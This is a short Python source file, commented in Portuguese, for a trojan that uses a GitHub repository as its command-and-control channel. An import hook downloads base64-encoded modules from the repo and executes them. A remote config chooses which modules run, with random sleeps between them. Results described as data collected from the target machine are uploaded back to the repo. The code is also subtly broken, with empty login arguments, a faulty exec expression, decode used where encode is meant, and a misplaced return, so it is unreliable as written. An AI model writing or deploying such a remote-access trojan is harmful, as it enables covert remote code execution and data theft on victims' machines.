"""fazendo a interação do T com o git"""

import json
import base64
import sys
import time
import random
import threading
import queue
from importlib import abc
from github3 import login


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print('[+] Attempting to retrieve {}'.format(fullname))
            new_library = get_file_contets('modules/{}'.format(fullname))

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = abc.Loader.create_module(name, spec="name")
        exec(str(self.current_module_code in module.__dict__))
        sys.modules[name] = module

        return module


t_id = "abc"

t_config = "{}.json".format(t_id)
data_path = "data/{}/".format(t_id)
t_modules = []
configured = False
task_queue = queue.Queue()


# autentica a conexao do usuario ao repositorio e pega o repositorio e branch
def connect_to_git():
    gh = login(username=, password=)
    repo = gh.repository("","chapter7")
    branch = repo.branch("master")

    return gh, repo, branch


# responsavel por pegar o repositorio remoto e ler localmente
def get_file_contets(filepath):
    gh,repo,branch = connect_to_git()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree():
        if filepath in filename.path:
            print('[*] Found file {}'.format(filepath))
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

# responsavel por recuperar a configuração remota do documento e para o T saber em qual modulo ele tem que rodar
def get_t_config():
    global configured
    config_json = get_file_contets(t_config)
    conf = json.loads(base64.b64decode(config_json))
    configured = True

    for task in conf:
        if task['module'] not in sys.modules:
            exec("import {}".format(task['module']))

        return conf


# responsavel por guardar dados coletados da maquina alvo
def store_module_result(data):
    gh,repo,branch = connect_to_git()
    remote_path = "data/{}/{}.data".format(t_id,random.randint(1000,100000))
    repo.create_file(remote_path, " Commit Message ",base64.b64decode(data))

    return


def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return

sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_t_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module']))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))